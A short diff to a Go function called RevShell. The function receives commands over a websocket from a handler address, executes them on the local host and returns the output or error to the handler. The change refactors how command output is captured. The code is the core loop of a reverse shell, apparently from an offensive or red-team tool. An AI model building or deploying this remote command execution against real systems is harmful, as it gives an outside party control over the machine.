@@ -19,15 +19,14 @@ func RevShell(handlerAddr string) {
 			return
 		}
 
-		cmd := execCommand(string(msg))
+		out, err := execCommand(string(msg))
 
-		out, err := cmd.CombinedOutput()
 		if err != nil {
 			// If the command fails still send the error message back to handler
 			conn.WriteMessage(websocket.TextMessage, []byte(err.Error()))
 			continue
 		}
 
-		conn.WriteMessage(websocket.TextMessage, out)
+		conn.WriteMessage(websocket.TextMessage, []byte(out))
 	}
 }
